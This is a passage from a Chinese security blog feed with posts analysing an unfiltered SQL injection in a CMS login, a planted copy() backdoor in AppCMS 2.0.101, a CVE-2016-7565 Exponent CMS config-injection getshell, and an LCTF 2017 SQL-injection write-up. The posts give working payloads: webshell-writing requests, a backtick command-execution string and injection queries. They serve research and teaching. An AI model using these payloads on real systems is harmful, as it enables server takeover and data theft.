<h1 id="sql注入二：ad-login-php"><a href="#sql注入二：ad-login-php" class="headerlink" title="sql注入二：ad/login.php"></a>sql注入二：ad/login.php</h1><p>填写用户名和密码后，点击提交，会访问<code>login.php?g=jsloginpost</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">..</div><div class="line">@$user=$_POST[<span class="string">"user"</span>];</div><div class="line">@$psw=$_POST[<span class="string">"psw"</span>];</div><div class="line">@$loginlong=$_POST[<span class="string">"loginlong"</span>];</div><div class="line"></div><div class="line">@$g=$_GET[<span class="string">"g"</span>];</div><div class="line">    <span class="keyword">switch</span> ($g)</div><div class="line">    &#123;</div><div class="line">    <span class="keyword">case</span> <span class="string">"jsloginpost"</span>:jsloginpost();<span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">"exit"</span>:loginexit();<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:index();<span class="keyword">break</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>第84行左右：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsloginpost</span><span class="params">()</span></span>&#123;</div><div class="line"><span class="keyword">global</span> $tabhead;</div><div class="line"><span class="keyword">global</span> $txtchk;</div><div class="line">@$user=$_POST[<span class="string">"user"</span>];</div><div class="line">@$psw=$_POST[<span class="string">"psw"</span>];$psw = authcode(@$psw, <span class="string">'ENCODE'</span>, <span class="string">'key'</span>,<span class="number">0</span>);</div><div class="line">@$loginlong=$_POST[<span class="string">"loginlong"</span>];</div><div class="line"></div><div class="line">setcookie(<span class="string">"lggqsj"</span>,date(<span class="string">'Y-m-d H:i:s'</span>,time()+$loginlong), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>,<span class="string">"/; HttpOnly"</span> , <span class="string">""</span>,<span class="string">''</span>);</div><div class="line"></div><div class="line">$tab=$tabhead.<span class="string">"adusers"</span>;</div><div class="line">$chk=<span class="string">" where adnaa='"</span>.$user.<span class="string">"' and adpss='"</span>.$psw.<span class="string">"' "</span>;</div><div class="line">mysql_select_db($tab);</div><div class="line">$sql = mysql_query(<span class="string">"select * from "</span>.$tab.$chk);</div><div class="line"><span class="keyword">if</span>(!$sql)&#123;$jieguo=<span class="string">"&lt;div id=redmsg&gt;(数据库查询失败!)&lt;/div&gt;"</span>;&#125;<span class="keyword">else</span>&#123;</div><div class="line">	$num=mysql_num_rows($sql);</div><div class="line">				<span class="keyword">if</span>($num==<span class="number">0</span>)&#123;$jieguo=<span class="string">'&lt;div id=redmsg&gt;登录失败：账户或密码错误！&lt;/div&gt;'</span>;&#125;</div><div class="line">				<span class="keyword">else</span>&#123;</div><div class="line">loginpass($loginlong);</div><div class="line">				$jieguo=<span class="string">'&lt;div id=bluemsg&gt;登录成功！正在前往&lt;a href="index.php"&gt;后台&lt;/a&gt;。。。&lt;/div&gt;&lt;meta http-equiv="refresh" content="1;url=index.php"&gt;'</span>;</div><div class="line">				@$chkmoblie=isMobile();</div><div class="line">				<span class="keyword">if</span>($chkmoblie==<span class="number">1</span>)&#123;$jieguo=<span class="string">'&lt;div id=bluemsg&gt;登录成功！正在前往&lt;a href="wap.php"&gt;后台&lt;/a&gt;。。。&lt;/div&gt;&lt;meta http-equiv="refresh" content="1;url=wap.php"&gt;'</span>;&#125;</div><div class="line">				&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line">$json_arr = <span class="keyword">array</span>(<span class="string">"jieguo"</span>=&gt;$jieguo);</div><div class="line">$json_obj = json_encode($json_arr);</div><div class="line"><span class="keyword">echo</span> $json_obj;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>所以可以惊奇的发现，这里没有任何过滤，单引号也没有，啥都没有。。。。</p>
<p>为方便，我加了一句<code>echo $chk;</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171226/4.jpg?raw=true" alt=""></p>
<p>登陆成功。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;继续水一水，把以前随手看的发上来。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="sql注入" scheme="http://chybeta.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>AppCMS 2.0.101 后门分析</title>
    <link href="http://chybeta.github.io/2017/12/17/AppCMS-2-0-101-%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2017/12/17/AppCMS-2-0-101-后门分析/</id>
    <published>2017-12-17T12:36:13.000Z</published>
    <updated>2018-01-25T06:19:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>AppCMS 2.0.101 后门分析<br><a id="more"></a></p>
<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>下载地址：<a href="http://www.appcms.cc/html/gengxin.html" target="_blank" rel="external">http://www.appcms.cc/html/gengxin.html</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/4.png?raw=true" alt=""></p>
<p>官方的更新时间是 2015-8-1</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>用beyond compare比较与前一个版本的区别</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/1.png?raw=true" alt=""></p>
<p>可以发现，在 templates/m/ 文件夹下出现了一个 content_list.php 文件，修改时间为 2017年5月25日。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/3.png?raw=true" alt=""></p>
<p>经过解密，<code>9c224bc6b59179729b15e1dddcbb5c82</code>为字符串<code>kejishidai</code>的md5值。</p>
<p>由代码知，这里存在一个copy函数构成的后门。</p>
<p>在第12行，实际执行的即为:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">copy(trim($_GET[url]),$_GET[cms]);</div></pre></td></tr></table></figure></p>
<p>将参数url设置为<code>php://input</code>，参数cms设置为shell的文件名，然后POST传入webshell。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/content_list.php?session=kejishidai&amp;url=php://input&amp;cms=temp.php</div><div class="line"></div><div class="line">POST:</div><div class="line">&lt;?php phpinfo();?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/5.png?raw=true" alt=""></p>
<p>接着访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/temp.php</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/6.png?raw=true" alt=""></p>
<p>getshell。</p>
<h1 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h1><p>删除 templates/m/ 文件夹下的content_list.php。</p>
<h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><p><a href="http://github.com/chybeta/cmspoc" target="_blank" rel="external">cmsPoc</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/tty.gif?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;AppCMS 2.0.101 后门分析&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="后门分析" scheme="http://chybeta.github.io/tags/%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>[CVE-2016-7565]Exponent CMS 2.3.9 配置文件写入 getshell分析</title>
    <link href="http://chybeta.github.io/2017/12/11/CVE-2016-7565-Exponent-CMS-2-3-9-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-getshell%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2017/12/11/CVE-2016-7565-Exponent-CMS-2-3-9-配置文件写入-getshell分析/</id>
    <published>2017-12-11T04:54:44.000Z</published>
    <updated>2017-12-11T23:21:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近一直在给<a href="https://github.com/CHYbeta/cmsPoc/wiki/Scripts" target="_blank" rel="external">cmsPoc</a>写各种cms的exp/poc。遇到了这个配置文件写入从而getshell的洞，想到了P神-代码审计圈里分享过的一道审计题，借此分析一波。<br><a id="more"></a></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171211/tty.gif?raw=true" alt=""></p>
<p><a href="https://github.com/CHYbeta/cmsPoc/wiki/Scripts" target="_blank" rel="external">cmsPoc</a>里用的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">install/index.php?sc[SMTP_PORT]=25\\&apos;);echo `$_POST[chybeta]`;//</div></pre></td></tr></table></figure></p>
<p>下面基于这个payload进行分析。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在 install/index.php 的第44行左右：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"><span class="keyword">include_once</span>(<span class="string">'../exponent.php'</span>);</div><div class="line">expString::sanitize($_REQUEST);</div></pre></td></tr></table></figure></p>
<p>在 framework/core/subsystems/expString.php 的第502行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">(&amp;$data)</span> </span>&#123;</div><div class="line"><span class="comment">//        return $data;</span></div><div class="line"></div><div class="line">	<span class="keyword">if</span> (is_array($data)) &#123;</div><div class="line">		$saved_params = <span class="keyword">array</span>();</div><div class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($data[<span class="string">'controller'</span>]) &amp;&amp; $data[<span class="string">'controller'</span>] == <span class="string">'snippet'</span>) &#123;</div><div class="line">			$saved_params[<span class="string">'body'</span>] = $data[<span class="string">'body'</span>];  <span class="comment">// store snippet body</span></div><div class="line">		&#125;</div><div class="line">		<span class="keyword">foreach</span> ($data <span class="keyword">as</span> $var=&gt;$val) &#123;</div><div class="line"><span class="comment">//                $data[$var] = self::sanitize($val);</span></div><div class="line">			$data[$var] = <span class="keyword">self</span>::xss_clean($val);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($saved_params)) &#123;</div><div class="line">			$data = array_merge($data, $saved_params);  <span class="comment">// add stored snippet body</span></div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>由于 <code>$_REQUEST</code>是个数组，从代码中可以看到只经过了<code>xss_clean</code>的检查，这对我们的payload没有影响。因此经过<code>sanitize</code>后，仍然有<code>sc[SMTP_PORT]=25\\&#39;);echo `$_POST[chybeta]`;//</code></p>
<p>继续分析，install/index.php 的第56行左右：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line"><span class="comment">// Create or update the config settings</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'sc'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"../framework/conf/config.php"</span>)) &#123;</div><div class="line">        <span class="comment">// Update the config</span></div><div class="line">        <span class="keyword">foreach</span> ($_REQUEST[<span class="string">'sc'</span>] <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">            expSettings::change($key, $value);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>对于一个已经安装完成的exponent，其文件<code>framework/conf/config.php</code>必定是存在的，所以当传入参数<code>$_REQUEST[&#39;sc&#39;]</code>，会进入更新config的流程。</p>
<p><code>expSettings::change</code>定义在 <code>framework\core\subsystems\expSettings.php</code>中的第220行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($var, $val)</span></span></div><div class="line">&#123;</div><div class="line">	$conf = <span class="keyword">self</span>::parseFile(BASE . <span class="string">'framework/conf/config.php'</span>);</div><div class="line">	$conf[$var] = $val;</div><div class="line">	<span class="keyword">self</span>::saveValues($conf);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>self::parseFile</code>定义在该文件的第140行，其作用是将config.php中的内容解析出来。接下去的一行，将我们传入的<code>$key</code>和<code>$value</code>进行设置，即执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$var = &quot;SMTP_PORT&quot;</div><div class="line">$val = &quot;25\\&apos;);echo `$_POST[chybeta]`;//&quot;;</div><div class="line">$conf[$var]=$val;</div></pre></td></tr></table></figure></p>
<p>接下去进行写入，即<code>self::saveValues</code>，该函数定义在该文件expSettings.php的第175行左右：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">saveValues</span><span class="params">($values, $configname = <span class="string">''</span>)</span>  //<span class="title">FIXME</span> <span class="title">only</span> <span class="title">used</span> <span class="title">with</span> <span class="title">themes</span> <span class="title">and</span> <span class="title">self</span>::<span class="title">change</span><span class="params">()</span> <span class="title">method</span></span></div><div class="line">&#123;</div><div class="line">	$profile = <span class="keyword">null</span>;</div><div class="line">	$str = <span class="string">"&lt;?php\n"</span>;</div><div class="line">	<span class="keyword">foreach</span> ($values <span class="keyword">as</span> $directive =&gt; $value) &#123;</div><div class="line">		$directive = trim(strtoupper($directive));</div><div class="line">		<span class="keyword">if</span> ($directive == <span class="string">'CURRENTCONFIGNAME'</span>) &#123;  <span class="comment">// save and strip out the profile name</span></div><div class="line">			$profile = $value;</div><div class="line">			<span class="keyword">continue</span>;</div><div class="line">		&#125;</div><div class="line">		$str .= <span class="string">"define(\"$directive\","</span>;</div><div class="line">		$value = stripslashes($value); <span class="comment">// slashes added by POST</span></div></pre></td></tr></table></figure>
<p>可以看到对于<code>$value</code>，先经过了一次<code>stripslashes</code>，这会将value值中原有的反斜杠（<code>\</code>）去掉。<code>25\\&#39;);echo `$_POST[chybeta]`;//</code>中，25后面的第一个反斜杠（<code>\</code>）将会被去掉，再之后的一个反斜杠（<code>\</code>），被当作是后面单引号的转义符，因此不会被去除。因此<code>$value</code>的值为下面这个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">25\&apos;);echo `$_POST[chybeta]`;//</div></pre></td></tr></table></figure></p>
<p>完成上述操作后，继续执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (substr($directive, <span class="number">-5</span>, <span class="number">5</span>) == <span class="string">"_HTML"</span>) &#123;</div><div class="line">	$value = htmlentities($value, ENT_QUOTES, LANG_CHARSET);</div><div class="line"><span class="comment">//              $value = str_replace(array("\r\n","\r","\n"),"&lt;br /&gt;",$value);</span></div><div class="line">	$value = str_replace(<span class="keyword">array</span>(<span class="string">"\r\n"</span>, <span class="string">"\r"</span>, <span class="string">"\n"</span>), <span class="string">""</span>, $value);</div><div class="line"><span class="comment">//                $value = str_replace(array('\r\n', '\r', '\n'), "", $value);</span></div><div class="line">	$str .= <span class="string">"exponent_unhtmlentities('$value')"</span>;</div><div class="line">&#125; <span class="keyword">elseif</span> (is_int($value)) &#123;</div><div class="line">	$str .= <span class="string">"'"</span> . $value . <span class="string">"'"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">if</span> ($directive != <span class="string">'SESSION_TIMEOUT'</span>) &#123;</div><div class="line">		$str .= <span class="string">"'"</span> . str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, $value) . <span class="string">"'"</span>;  <span class="comment">//FIXME is this still necessary since we stripslashes above???</span></div><div class="line">	&#125; <span class="comment">//                    $str .= "'".$value."'";</span></div><div class="line">	<span class="keyword">else</span> &#123;</div><div class="line">		$str .= <span class="string">"'"</span> . str_replace(<span class="string">"'"</span>, <span class="string">''</span>, $value) . <span class="string">"'"</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">$str .= <span class="string">");\n"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$str .= <span class="string">'?&gt;'</span>;</div><div class="line"><span class="comment">//		$configname = empty($values['CURRENTCONFIGNAME']) ? '' : $values['CURRENTCONFIGNAME'];</span></div><div class="line"><span class="keyword">if</span> ($configname == <span class="string">''</span>) &#123;</div><div class="line">$str .= <span class="string">"\n&lt;?php\ndefine(\"CURRENTCONFIGNAME\",\"$profile\");\n?&gt;"</span>; <span class="comment">// add  profile name to end of active profile</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">self</span>::writeFile($str, $configname);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>由于我们的payload为<code>sc[SMTP_PORT]</code>，不以<code>_HTML</code>结尾，且不为<code>SESSION_TIMEOUT</code>，因此会执行下面这条语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$str .= &quot;&apos;&quot; . str_replace(&quot;&apos;&quot;, &quot;\&apos;&quot;, $value) . &quot;&apos;&quot;;</div></pre></td></tr></table></figure></p>
<p>对应前面的<code>$value</code>，它将<code>$value</code>中的单引号前又加上了一次反斜杠，导致<code>$value</code>的值现在变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">25\\&apos;);echo `$_POST[chybeta]`;//</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171211/1.png?raw=true" alt=""></p>
<p>最后的操作就是将得到的内容写入到配置文件中了。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171211/2.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">define(&quot;SMTP_PORT&quot;,&apos;$value&apos;);</div><div class="line">即为</div><div class="line">define(&quot;SMTP_PORT&quot;,&apos;25\\&apos;);echo `$_POST[chybeta]`;//&apos;);</div></pre></td></tr></table></figure>
<p>由于第一个反斜杠的存在，它把第二个反斜杠给转义了，从而导致了后面这个单引号的逃逸，进一步的使我们能够成功的闭合define。接下来又利用了php的<code>//</code>注释将原有的括号注释掉，从而getshell。</p>
<h1 id="P神的审计题"><a href="#P神的审计题" class="headerlink" title="P神的审计题"></a>P神的审计题</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171211/3.png?raw=true" alt=""></p>
<p>与本次漏洞分析异曲同工之妙的一种解法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?option=aaa\&apos;;phpinfo();//</div></pre></td></tr></table></figure>
<p>经过addslashes后，$str为 <code>aaa\\\&#39;;phpinfo();//</code></p>
<p>经过preg_replace正则匹配后，对<code>\</code>做了转义处理,xxxxx/option.php的内容变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;aaa\\&apos;;phpinfo();//&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>同样利用第一个斜杠转义第二个斜杠，从而导致了单引号的逃逸。</p>
<p>另一种解答方法放在 <a href="https://github.com/CHYbeta/Code-Audit-Challenges/blob/master/php/challenge-3.md" target="_blank" rel="external">Code-Audit-Challenges PHP challenge-3</a></p>
<p>更多解答，请见代码审计-知识星球。</p>
<p>(那个，有没有广告费？)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近一直在给&lt;a href=&quot;https://github.com/CHYbeta/cmsPoc/wiki/Scripts&quot;&gt;cmsPoc&lt;/a&gt;写各种cms的exp/poc。遇到了这个配置文件写入从而getshell的洞，想到了P神-代码审计圈里分享过的一道审计题，借此分析一波。&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
    
      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>LCTF-2017-他们有什么秘密呢-writeup</title>
    <link href="http://chybeta.github.io/2017/11/19/LCTF-2017-%E4%BB%96%E4%BB%AC%E6%9C%89%E4%BB%80%E4%B9%88%E7%A7%98%E5%AF%86%E5%91%A2-writeup/"/>
    <id>http://chybeta.github.io/2017/11/19/LCTF-2017-他们有什么秘密呢-writeup/</id>
    <published>2017-11-19T12:54:01.000Z</published>
    <updated>2017-11-22T14:51:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>补充关于第一阶段sql注入知识/背景，第二节阶段命令执行详细过程及其知识点</p>
<p>LCTF-2017-他们有什么秘密呢-writeup<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">一个简单到不能再简单的......</div><div class="line">http://182.254.246.93/</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/9.png?raw=true" alt=""></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/10.png?raw=true" alt=""></p>
<p>这是第一关。查看源代码后，有如下tips：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ --&gt;</div></pre></td></tr></table></figure></p>
<p>所以目标很明确。</p>
<p>经过测试，过滤了information等关键字。而union，select等则没有过滤。</p>
<p>参考<a href="http://www.wupco.cn/?p=4117" target="_blank" rel="external">mysql注入可报错时爆表名、字段名、库名</a></p>
<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>文章中利用的是Polygon()函数，这个也被过滤了。我换了linestring()来报错注入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://182.254.246.93/entrance.php</div><div class="line"></div><div class="line">POST: pro_id=1 and linestring(pro_id)</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/11.png?raw=true" alt=""></p>
<p>得到如下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">数据库名：youcanneverfindme17</div><div class="line">表名：product_2017ctf</div><div class="line">部分字段名：pro_id</div></pre></td></tr></table></figure></p>
<p>除了linestring和Polygon外，其他同样能用来报错获取得到当前表名和字段的还有：</p>
<ol>
<li>multiPolygon(id)</li>
<li>multilinestring(id)</li>
<li>GeometryCollection(id)</li>
<li>MultiPoint(id)</li>
</ol>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/18.png?raw=true" alt=""></p>
<h3 id="查询字段名"><a href="#查询字段名" class="headerlink" title="查询字段名"></a>查询字段名</h3><p>其实这一步，可以跳过。因为利用union搭配别名子查询，可以达到在不知道字段名的时候进行注入。</p>
<p>为了完整性，这里试一下注出字段名。</p>
<p>利用<a href="https://drive.google.com/file/d/0B0r_xEcaZ8-JYzk3NzA0NzItNTJlMS00YTUyLThkNTQtODVkYmU4ZjMzM2Rj/view" target="_blank" rel="external">orangetw大佬的提过的技巧</a></p>
<p>基本的原理是子查询中不允许出现相同的表名，本地环境测试如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/19.png?raw=true" alt=""></p>
<p>之后可以利用using来逐步爆出字段名：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/20.png?raw=true" alt=""></p>
<p>举一反三：</p>
<p>第一步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id)) as c);</div><div class="line">Duplicate column name &apos;pro_name&apos;</div></pre></td></tr></table></figure></p>
<p>第二步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name)) as c);</div><div class="line">Duplicate column name &apos;owner&apos;</div></pre></td></tr></table></figure></p>
